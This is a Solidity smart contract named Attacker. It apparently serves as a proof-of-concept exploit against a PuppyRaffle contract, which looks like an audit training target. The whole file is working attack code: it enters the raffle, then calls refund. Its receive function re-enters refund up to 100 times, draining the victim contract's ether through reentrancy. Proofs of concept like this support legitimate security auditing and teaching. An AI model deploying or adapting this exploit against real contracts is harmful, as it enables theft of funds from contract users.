// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;


import {PuppyRaffle} from "./PuppyRaffle.sol";

contract Attacker {

    PuppyRaffle public victim;
    address public owner;
    address[] players;
    uint256 myIndex;

    uint256 public entranceFee;

    constructor(address victimAddress, uint256 fee) {
        victim = PuppyRaffle(victimAddress);
        owner = msg.sender;
        entranceFee = fee;
        players.push(address(this));
        players.push(msg.sender);
    }

    // Receive function for reetancy
    uint maxAttack = 100;
    uint countAttack;
     receive() external payable {
        if (countAttack < maxAttack) {
            countAttack++;
            victim.refund(myIndex);
        }
    }

    // Join the raffle first
    function enterRaffle() external payable {

        victim.enterRaffle{value: msg.value}(players);
        myIndex = victim.getActivePlayerIndex(address(this));

    }

    // Initiate the attack after entering
    function attack()external payable{
        victim.refund(myIndex);
    }

    // Check balance of the contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
